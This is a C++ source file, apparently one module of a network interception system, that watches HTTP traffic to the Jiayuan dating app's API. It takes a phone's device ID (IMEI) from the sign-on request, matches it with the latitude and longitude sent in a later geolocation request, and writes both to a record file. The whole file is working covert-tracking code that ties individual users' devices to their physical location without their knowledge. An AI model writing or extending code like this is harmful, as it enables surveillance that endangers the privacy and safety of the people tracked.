
#include "StdAfx.h"

#include "LocationShiJiJiaYuan.h"

map<string,string>location::ShiJiJiaYuan::uid_deviceinfo_ = map<string,string>();
location::ShiJiJiaYuan::ShiJiJiaYuan(HttpSession *http_session, const string &pro_name) : Location(http_session,pro_name)
{
	app_ = "ÊÀ¼Í¼ÑÔµ";
}

location::ShiJiJiaYuan::~ShiJiJiaYuan()
{
	
}

int location::ShiJiJiaYuan::IsShiJiJiaYuan(HttpSession *http_session)
{
	if(  ( http_session->m_Requestline.m_Host.Find("api.jiayuan.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/sign/signoninfo.php") != -1 ) )	
	{
		return kDeviceInfo;
	}

	if(  ( http_session->m_Requestline.m_Host.Find("api2.jiayuan.com")  != -1 ) && 
		( http_session->m_Requestline.m_URI.Find("/geo/userGeoInfo.php") != -1 ) )	
	{
		return kDeviceLocation;
	}
	return 0;
}

int location::ShiJiJiaYuan::Process(const char *packet,int action)
{
	if (action == kDeviceInfo)
	{
		return Deviceinfo(packet);
	}
	if (action == kDeviceLocation)
	{
		return DeviceLocation(packet);
	}
	return 0;
}

int location::ShiJiJiaYuan::Deviceinfo(const char *packet)
{
	string src_data(packet);
	ms_->SplitStringToMap(src_data,'&','=');
	string imei = ms_->GetValueFromMapByKey("deviceid");
	
	string uid = GetIpAgent();
	
	if (uid.empty() || imei.empty())
	{
		return 0;
	}
	
	uid_deviceinfo_.insert(std::make_pair(uid,imei));
	return 1;
}

int location::ShiJiJiaYuan::DeviceLocation(const char *packet)
{
	char *p = (char *)packet;
	if (!p)
	{
		return 0;
	}
	int len = http_session_->m_Requestline.m_nseq - http_session_->m_Requestline.m_Ssequence;
	int i = 0;
	for (;i <= len ; i++,p++)
	{
		if ( 0 == *p)
		{
			*p = ',';
		}
	}
	string src_data(packet);
	ms_->SplitStringToMap(src_data,'&','=');
	
	string lac = ms_->GetValueFromMapByKey("loc",true);
	ms_->Replace(lac,"{","");
	ms_->Replace(lac,"}","");
	ms_->SplitStringToMap(lac,',',':',"\"");
	longitude_ = ms_->GetValueFromMapByKey("lng");
	latitude_ = ms_->GetValueFromMapByKey("lat");
	
	if (longitude_.empty() || latitude_.empty())
	{
		return 0;
	}
	string uid = GetIpAgent();
	map<string,string>::iterator iter = uid_deviceinfo_.find(uid);
	if (iter == uid_deviceinfo_.end())
	{
		return 0;
	}
	
	string imei = iter->second;	
	uid_deviceinfo_.erase(uid);
	
	output_text_ = 
		"imei=" + imei + "\r\n" +
		"from=" + longitude_ + "\r\n" +
		"to=" + latitude_ + "\r\n" +
		"state=" + app_ + "\r\n";
	
	Record(app_);
	WriteIndexFile();
	return 1;
}